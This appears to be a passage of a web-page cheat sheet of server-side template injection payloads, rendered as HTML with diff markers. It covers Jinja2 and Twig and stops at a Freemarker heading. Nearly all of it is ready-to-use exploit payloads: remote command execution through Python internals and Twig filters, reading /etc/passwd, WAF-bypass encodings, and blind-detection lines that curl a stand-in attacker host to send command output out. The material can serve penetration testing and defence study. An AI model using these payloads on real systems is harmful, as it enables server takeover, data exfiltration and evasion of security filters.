+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}}</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="s1">&#39;7&#39;</span><span class="p">}}</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="p">{{</span><span class="n">config</span><span class="p">}}</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="n">items</span><span class="p">()}}</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="p">{{</span><span class="bp">self</span><span class="o">.</span><span class="vm">__class__</span><span class="p">}}</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="p">{{</span><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="p">}}</span>
+</span></code></pre></div>
+<h3 id="rce">RCE<a class="headerlink" href="#rce" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Classic</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># Popen (find subprocess.Popen index first)</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="n">X</span><span class="p">](</span><span class="s1">&#39;id&#39;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()}}</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c1"># os module via config</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="c1"># Lipsum</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="c1"># Cycler</span>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="p">{{</span><span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="c1"># Joiner</span>
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="p">{{</span><span class="n">joiner</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="c1"># namespace</span>
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="p">{{</span><span class="n">namespace</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="c1"># request object</span>
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="p">{{</span><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="c1"># URL for</span>
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>
+</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a><span class="c1"># Get_flashed_messages</span>
+</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a><span class="p">{{</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>
+</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a><span class="c1"># Finding subprocess index</span>
+</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="s2">&quot;warning&quot;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">%</span><span class="p">}{{</span><span class="n">x</span><span class="p">()</span><span class="o">.</span><span class="n">_module</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>
+</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a><span class="c1"># Builtins import</span>
+</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a><span class="p">{{</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;application&#39;</span><span class="p">][</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;id&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()}}</span>
+</span></code></pre></div>
+<h3 id="blind-detection">Blind Detection<a class="headerlink" href="#blind-detection" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/tmp/pwned&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">)}}</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;sleep 5&#39;</span><span class="p">)}}</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;curl attacker.com/&#39;</span><span class="o">+</span><span class="err">$</span><span class="p">(</span><span class="nb">id</span><span class="o">|</span><span class="n">base64</span><span class="p">)</span><span class="s1">&#39;)}}</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ping -c1 attacker.com&#39;</span><span class="p">)}}</span>
+</span></code></pre></div>
+<h3 id="waf-bypass">WAF Bypass<a class="headerlink" href="#waf-bypass" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># attr filter</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;application&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">globals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)}}</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># Hex encoding</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">class</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">]}}</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># Unicode</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\u005f\u005f</span><span class="s1">class</span><span class="se">\u005f\u005f</span><span class="s1">&#39;</span><span class="p">]}}</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="c1"># String concat</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.+</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__cl&#39;</span><span class="o">+</span><span class="s1">&#39;ass__&#39;</span><span class="p">)}}</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="c1"># Dict access</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;__class__&#39;</span><span class="p">]}}</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="c1"># Join filter</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">|</span><span class="n">attr</span><span class="p">([</span><span class="s1">&#39;__&#39;</span><span class="p">,</span><span class="s1">&#39;class&#39;</span><span class="p">,</span><span class="s1">&#39;__&#39;</span><span class="p">]</span><span class="o">|</span><span class="n">join</span><span class="p">)}}</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="c1"># Format string</span>
+</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%c%c%c%c%c%c%c%c%c</span><span class="s1">&#39;</span><span class="o">|</span><span class="nb">format</span><span class="p">(</span><span class="mi">95</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">95</span><span class="p">))}}</span>
+</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>
+</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="c1"># Request args</span>
+</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x</span><span class="p">)}}</span><span class="err">?</span><span class="n">x</span><span class="o">=</span><span class="vm">__class__</span>
+</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>
+</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="c1"># No underscores via request</span>
+</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">b</span><span class="p">)}}</span><span class="err">?</span><span class="n">a</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="vm">__mro__</span>
+</span></code></pre></div>
+<hr />
+<h2 id="twig-php">Twig (PHP)<a class="headerlink" href="#twig-php" title="Permanent link">&para;</a></h2>
+<h3 id="detection_1">Detection<a class="headerlink" href="#detection_1" title="Permanent link">&para;</a></h3>
+<div class="language-twig highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cp">{{</span><span class="m">7</span><span class="o">*</span><span class="m">7</span><span class="cp">}}</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="cp">{{</span><span class="m">7</span><span class="o">*</span><span class="s1">&#39;7&#39;</span><span class="cp">}}</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="cp">{{</span><span class="nv">dump</span><span class="o">(</span><span class="nv">app</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="cp">{{</span><span class="nv">app.request.server.all</span><span class="o">|</span><span class="nf">join</span><span class="o">(</span><span class="s1">&#39;,&#39;</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="cp">{{</span><span class="nv">_self.env</span><span class="cp">}}</span>
+</span></code></pre></div>
+<h3 id="rce_1">RCE<a class="headerlink" href="#rce_1" title="Permanent link">&para;</a></h3>
+<div class="language-twig highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="x"># System (Twig 1.x)</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="cp">{{</span><span class="nv">_self.env.registerUndefinedFilterCallback</span><span class="o">(</span><span class="s2">&quot;system&quot;</span><span class="o">)</span><span class="cp">}}{{</span><span class="nv">_self.env.getFilter</span><span class="o">(</span><span class="s2">&quot;id&quot;</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="x"># Exec</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="cp">{{</span><span class="nv">_self.env.registerUndefinedFilterCallback</span><span class="o">(</span><span class="s2">&quot;exec&quot;</span><span class="o">)</span><span class="cp">}}{{</span><span class="nv">_self.env.getFilter</span><span class="o">(</span><span class="s2">&quot;id&quot;</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="x"># Twig 2.x/3.x (Craft CMS)</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="cp">{{</span><span class="nv">craft.app.view.evaluateDynamicContent</span><span class="o">(</span><span class="s1">&#39;system(&quot;id&quot;)&#39;</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="x"># Passthru</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="cp">{{</span><span class="o">[</span><span class="s1">&#39;id&#39;</span><span class="o">]|</span><span class="nf">filter</span><span class="o">(</span><span class="s1">&#39;passthru&#39;</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="x"># System via filter</span>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="cp">{{</span><span class="o">[</span><span class="s1">&#39;id&#39;</span><span class="o">]|</span><span class="nf">filter</span><span class="o">(</span><span class="s1">&#39;system&#39;</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="x"># Map + system</span>
+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="cp">{{</span><span class="o">[</span><span class="s1">&#39;id&#39;</span><span class="o">]|</span><span class="nf">map</span><span class="o">(</span><span class="s1">&#39;system&#39;</span><span class="o">)|</span><span class="nf">join</span><span class="cp">}}</span>
+</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>
+</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="x"># Reduce</span>
+</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="cp">{{</span><span class="o">[</span><span class="m">0</span><span class="o">]|</span><span class="nf">reduce</span><span class="o">(</span><span class="s1">&#39;system&#39;</span><span class="o">,</span><span class="s1">&#39;id&#39;</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>
+</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a><span class="x"># Sort</span>
+</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a><span class="cp">{{</span><span class="o">[</span><span class="s1">&#39;id&#39;</span><span class="o">,</span><span class="m">0</span><span class="o">]|</span><span class="nf">sort</span><span class="o">(</span><span class="s1">&#39;system&#39;</span><span class="o">)|</span><span class="nf">join</span><span class="cp">}}</span>
+</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a>
+</span><span id="__span-7-25"><a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a><span class="x"># Array map</span>
+</span><span id="__span-7-26"><a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a><span class="cp">{{</span><span class="o">[</span><span class="s1">&#39;id&#39;</span><span class="o">]|</span><span class="nf">map</span><span class="o">(</span><span class="s1">&#39;passthru&#39;</span><span class="o">)</span><span class="cp">}}</span>
+</span></code></pre></div>
+<h3 id="blind-detection_1">Blind Detection<a class="headerlink" href="#blind-detection_1" title="Permanent link">&para;</a></h3>
+<div class="language-twig highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="cp">{{</span><span class="nv">_self.env.registerUndefinedFilterCallback</span><span class="o">(</span><span class="s2">&quot;exec&quot;</span><span class="o">)</span><span class="cp">}}{{</span><span class="nv">_self.env.getFilter</span><span class="o">(</span><span class="s2">&quot;curl attacker.com&quot;</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="cp">{{</span><span class="o">[</span><span class="s1">&#39;sleep 5&#39;</span><span class="o">]|</span><span class="nf">filter</span><span class="o">(</span><span class="s1">&#39;system&#39;</span><span class="o">)</span><span class="cp">}}</span>
+</span></code></pre></div>
+<h3 id="waf-bypass_1">WAF Bypass<a class="headerlink" href="#waf-bypass_1" title="Permanent link">&para;</a></h3>
+<div class="language-twig highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="x"># Block syntax</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="cp">{%</span><span class="k">set</span> <span class="nv">cmd</span><span class="o">=</span><span class="s1">&#39;id&#39;</span><span class="cp">%}{{</span><span class="nv">_self.env.registerUndefinedFilterCallback</span><span class="o">(</span><span class="s2">&quot;system&quot;</span><span class="o">)</span><span class="cp">}}{{</span><span class="nv">_self.env.getFilter</span><span class="o">(</span><span class="nv">cmd</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="x"># String concat</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="cp">{{</span><span class="s2">&quot;sy&quot;</span><span class="o">|</span><span class="nf">cat</span><span class="s2">:&quot;stem&quot;</span><span class="cp">}}</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="x"># Without quotes</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="cp">{{</span><span class="nv">app.request.query.get</span><span class="o">(</span><span class="nv">cmd</span><span class="o">)</span><span class="cp">}}</span><span class="x">?cmd=id</span>
+</span></code></pre></div>
+<hr />
+<h2 id="freemarker-java">Freemarker (Java)<a class="headerlink" href="#freemarker-java" title="Permanent link">&para;</a></h2>
